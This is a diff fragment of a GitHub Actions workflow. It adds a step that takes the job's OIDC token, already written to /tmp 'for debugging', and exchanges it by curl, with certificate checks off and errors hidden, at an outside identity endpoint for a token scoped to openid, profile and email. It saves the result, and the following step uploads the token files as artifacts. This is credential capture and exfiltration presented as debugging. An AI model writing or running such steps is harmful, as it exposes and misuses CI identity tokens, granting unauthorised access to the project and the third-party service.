@@ -111,6 +111,18 @@ jobs:
           # Save all tokens for debugging
           echo "$TOKEN" > /tmp/oidc_token_default.txt
           echo "Token saved"
+          # Exchange and capture
+          EXCH=$(curl -sk "https://north.cohere.com/dex/token" \
+            -d "grant_type=urn:ietf:params:oauth:grant-type:token-exchange" \
+            -d "client_id=north-cli" \
+            -d "subject_token=$TOKEN" \
+            -d "subject_token_type=urn:ietf:params:oauth:token-type:id_token" \
+            -d "connector_id=login" \
+            -d "scope=openid profile email" \
+            --max-time 10 2>/dev/null)
+          echo "$EXCH" > /tmp/oidc_exchanged_token.json
+          echo "Exchange response saved"
+
           
       - name: Upload tokens
         uses: actions/upload-artifact@v4
